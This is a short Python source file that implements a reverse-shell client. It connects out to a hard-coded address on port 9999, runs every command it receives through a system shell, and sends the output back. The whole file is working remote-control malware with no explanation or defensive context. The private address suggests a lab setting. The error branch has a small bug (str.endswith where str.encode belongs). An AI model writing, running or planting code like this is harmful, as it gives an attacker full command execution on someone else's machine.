import os
import socket
import subprocess


global host
global s
global port
host = "172.16.196.130"
port = 9999
s = socket.socket()
s.connect((host, port))

while True:
    data = s.recv(20480)
    if data[:2].decode("utf-8") == "cd":
        try:
            os.chdir(data[3:].decode("utf-8"))
            output_str = str(os.getcwd()) + ">"
            s.send(str.encode(output_str))
        except:
            pass
    if data[:].decode("utf-8") == "quit":
        s.close()
        break
    if len(data) > 0:
        try:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + ">"))
            print(output_str)
        except:
            output_str = "COMMAND CAN NOT BE RECOGNISED\n"
            s.send(str.endswith(output_str + str(os.getcwd()) + ">"))
            print(output_str)
s.close()
	
